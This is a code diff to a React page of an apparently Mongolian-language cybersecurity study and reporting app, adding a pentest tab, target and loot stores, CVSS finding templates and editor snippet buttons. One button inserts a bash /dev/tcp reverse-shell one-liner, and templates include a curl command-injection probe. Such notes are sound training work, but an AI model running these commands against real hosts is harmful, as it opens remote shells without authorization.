@@ -38,15 +38,18 @@ import {
   Search,
   Server,
   Shield,
+  ShieldAlert,
   Sparkles,
   Sun,
   Target,
+  Terminal,
   TerminalSquare,
   Trash2,
   Upload,
   User,
   Waypoints,
   X,
+  Flame,
 } from "lucide-react";
 import { ChangeEvent, useEffect, useMemo, useRef, useState } from "react";
 import DOMPurify from "dompurify";
@@ -73,6 +76,19 @@ import AIChatBot from "@/components/AIChatBot";
 import DocumentDiagram from "@/components/DocumentDiagram";
 import KnowledgeAtlas from "@/components/KnowledgeAtlas";
 import InsightsDashboard from "@/components/InsightsDashboard";
+import PentestHub, { type PentestSubTab } from "@/components/pentest/PentestHub";
+import QuickPentestHUD from "@/components/pentest/QuickPentestHUD";
+import {
+  readTargets,
+  saveTargets,
+  readLoot,
+  saveLoot,
+  readPentestConfig,
+  savePentestConfig,
+  type TargetHost,
+  type LootItem,
+  type PentestConfig,
+} from "@/lib/pentest/pentestStore";
 import { editKey } from "@/lib/graphEdits";
 import {
   buildConceptNetwork,
@@ -303,6 +319,7 @@ const initialPlaybooks: PlaybookItem[] = [
 
 const navItems = [
   { label: "Ерөнхий", icon: LayoutDashboard },
+  { label: "Пентест", icon: ShieldAlert },
   { label: "Тайлан", icon: FileText },
   { label: "Сургалт", icon: BookOpen },
   { label: "Замын зураг", icon: Target },
@@ -355,6 +372,15 @@ const reportTemplates = [
     tags: ["hackthebox", "machine"],
     content:
       "## Машины мэдээлэл\n\nАнхны хандалт (User shell) ба эрх ахиулалт (Root flag).\n\n## Эмзэг байдал\n\n",
+  },
+  {
+    key: "pentest-finding",
+    label: "🛡️ CVSS Эмзэг байдлын олдвор",
+    source: "Cyber" as const,
+    stage: "Live Fire",
+    tags: ["cvss-finding", "vulnerability", "high", "poc"],
+    content:
+      "# [Vulnerability Title]\n\n- **Үнэлгээ (Severity):** HIGH (CVSS:3.1 Base Score: 7.8)\n- **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`\n- **Зорилтот систем (Target):** `10.10.11.45:80`\n\n## 1. Эмзэг байдлын тодорхойлолт (Description)\n\n\n## 2. Үр дагавар (Impact)\n\n\n## 3. Баталгаажуулах алхмууд (Proof of Concept)\n\n```bash\n# Reproduce exploit\ncurl -X POST http://10.10.11.45/api/endpoint -d \"payload=...\"\n```\n\n## 4. Засварлах зөвлөмж (Remediation)\n\n",
   },
   {
     key: "cloud",
@@ -670,6 +696,25 @@ export default function Home() {
   const [reports, setReports] = useState<Report[]>(readReports);
   const [tasks, setTasks] = useState<TaskItem[]>(readTasks);
   const [playbooks, setPlaybooks] = useState<PlaybookItem[]>(readPlaybooks);
+  const [targets, setTargets] = useState<TargetHost[]>(readTargets);
+  const [loot, setLoot] = useState<LootItem[]>(readLoot);
+  const [pentestConfig, setPentestConfig] = useState<PentestConfig>(readPentestConfig);
+  const [pentestSubTab, setPentestSubTab] = useState<PentestSubTab>("targets");
+
+  const handleUpdateTargets = (nextTargets: TargetHost[]) => {
+    setTargets(nextTargets);
+    saveTargets(nextTargets);
+  };
+
+  const handleUpdateLoot = (nextLoot: LootItem[]) => {
+    setLoot(nextLoot);
+    saveLoot(nextLoot);
+  };
+
+  const handleUpdatePentestConfig = (nextConfig: PentestConfig) => {
+    setPentestConfig(nextConfig);
+    savePentestConfig(nextConfig);
+  };
   const [trackProgress, setTrackProgress] = useState<Record<string, boolean>>(readTrackProgress);
   const [activeTrackId, setActiveTrackId] = useState(
     () => localStorage.getItem("operator-dossier-active-track") || defaultTrackId
@@ -1763,8 +1808,46 @@ export default function Home() {
       }
     });
 
+    targets.forEach(tgt => {
+      if (
+        tgt.ip.toLowerCase().includes(q) ||
+        (tgt.hostname && tgt.hostname.toLowerCase().includes(q)) ||
+        (tgt.notes && tgt.notes.toLowerCase().includes(q))
+      ) {
+        matches.push({
+          title: `🎯 ${tgt.ip} (${tgt.hostname || tgt.os})`,
+          subtitle: `${tgt.status} · ${tgt.ports.length} портууд`,
+          category: "Пентест",
+          onSelect: () => {
+            setPentestSubTab("targets");
+            setActiveNav("Пентест");
+            setCommandPaletteOpen(false);
+          },
+        });
+      }
+    });
+
+    loot.forEach(l => {
+      if (
+        l.username.toLowerCase().includes(q) ||
+        l.host.toLowerCase().includes(q) ||
+        l.service.toLowerCase().includes(q)
+      ) {
+        matches.push({
+          title: `🔑 ${l.username} @ ${l.host}`,
+          subtitle: `${l.service} · ${l.type} · ${l.status}`,
+          category: "Олз (Loot)",
+          onSelect: () => {
+            setPentestSubTab("loot");
+            setActiveNav("Пентест");
+            setCommandPaletteOpen(false);
+          },
+        });
+      }
+    });
+
     return matches;
-  }, [commandSearch, visibleReports, playbooks, tasks]);
+  }, [commandSearch, visibleReports, playbooks, tasks, targets, loot]);
 
   return (
     <div className="app-shell">
@@ -1796,6 +1879,9 @@ export default function Home() {
               >
                 <Icon size={15} />
                 <span>{item.label}</span>
+                {item.label === "Пентест" && (
+                  <span className="nav-count">{targets.length}</span>
+                )}
                 {item.label === "Тайлан" && (
                   <span className="nav-count">{visibleReports.length}</span>
                 )}
@@ -2295,6 +2381,52 @@ export default function Home() {
               </div>
             </section>
           </>
+        )}
+
+        {activeNav === "Пентест" && (
+          <section className="pentest-page">
+            <PentestHub
+              targets={targets}
+              onUpdateTargets={handleUpdateTargets}
+              loot={loot}
+              onUpdateLoot={handleUpdateLoot}
+              config={pentestConfig}
+              onUpdateConfig={handleUpdatePentestConfig}
+              reports={reports}
+              initialSubTab={pentestSubTab}
+              onCreateFindingReport={reportData => {
+                const newId = Date.now();
+                const newReport: Report = {
+                  id: newId,
+                  title: reportData.title,
+                  room: reportData.room,
+                  source: "Cyber",
+                  stage: reportData.stage,
+                  tags: reportData.tags,
+                  status: "Published",
+                  readTime: "05 min",
+                  date: formatReportDate(new Date()),
+                  excerpt:
+                    reportData.excerpt ||
+                    reportData.content
+                      .slice(0, 150)
+                      .replace(/[#*`\n]/g, " "),
+                  content: reportData.content,
+                };
+                const next = [newReport, ...reports];
+                setReports(next);
+                saveReports(next);
+                touchReportMeta(workspaceKey, newId);
+                setSelectedId(newId);
+                setActiveNav("Тайлан");
+                toast.success("Шинэ олдвор тайлангийн санд нэмэгдлээ!");
+              }}
+              onSelectReport={reportId => {
+                setSelectedId(reportId);
+                setActiveNav("Тайлан");
+              }}
+            />
+          </section>
         )}
 
         {activeNav === "Тайлан" && (
@@ -3315,6 +3447,15 @@ export default function Home() {
         onOpenRoom={slug => window.open(thmRoomUrl(slug), "_blank", "noreferrer")}
       />
 
+      <QuickPentestHUD
+        config={pentestConfig}
+        onUpdateConfig={handleUpdatePentestConfig}
+        onOpenPentestHub={sub => {
+          if (sub) setPentestSubTab(sub as any);
+          setActiveNav("Пентест");
+        }}
+      />
+
       {editorOpen && (
         <div
           className="editor-overlay"
@@ -3445,6 +3586,41 @@ export default function Home() {
             </label>
             <label>
               Агуулга (Markdown)
+              <div style={{ display: "flex", gap: 6, margin: "6px 0", flexWrap: "wrap" }}>
+                <button
+                  type="button"
+                  className="text-btn-tiny"
+                  onClick={() => {
+                    const snippet = `\n### 🛡️ Олдвор: [Эмзэг байдлын нэр]\n- **Үнэлгээ (Severity):** HIGH (CVSS 7.8)\n- **CVSS Vector:** \`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\`\n- **Зорилтот систем:** \`${pentestConfig.rhost}:${pentestConfig.rport}\`\n\n#### Тодорхойлолт\n\n\n#### Баталгаажуулалт (PoC)\n\`\`\`bash\ncurl -X POST http://${pentestConfig.rhost}:${pentestConfig.rport}/api -d "cmd=id"\n\`\`\`\n\n#### Засварлах зөвлөмж\n\n`;
+                    setNewContent(prev => prev + snippet);
+                    toast.success("CVSS Олдворын загвар нэмэгдлээ");
+                  }}
+                >
+                  <ShieldAlert size={11} /> + CVSS Олдвор
+                </button>
+                <button
+                  type="button"
+                  className="text-btn-tiny"
+                  onClick={() => {
+                    const snippet = `\n### 🎯 Нээлттэй портууд (${pentestConfig.rhost})\n| Порт | Протокол | Төлөв | Үйлчилгээ | Хувилбар |\n| :--- | :--- | :--- | :--- | :--- |\n| \`22\` | TCP | open | ssh | OpenSSH |\n| \`80\` | TCP | open | http | Web Server |\n| \`445\` | TCP | open | smb | Samba |\n`;
+                    setNewContent(prev => prev + snippet);
+                    toast.success("Портын хүснэгт нэмэгдлээ");
+                  }}
+                >
+                  <Terminal size={11} /> + Портын хүснэгт
+                </button>
+                <button
+                  type="button"
+                  className="text-btn-tiny"
+                  onClick={() => {
+                    const snippet = `\n\`\`\`bash\n# Reverse Shell (LHOST=${pentestConfig.lhost}, LPORT=${pentestConfig.lport})\nbash -i >& /dev/tcp/${pentestConfig.lhost}/${pentestConfig.lport} 0>&1\n\`\`\`\n`;
+                    setNewContent(prev => prev + snippet);
+                    toast.success("Reverse Shell нэмэгдлээ");
+                  }}
+                >
+                  <Flame size={11} /> + Reverse Shell
+                </button>
+              </div>
               <textarea
                 value={newContent}
                 onChange={event => setNewContent(event.target.value)}
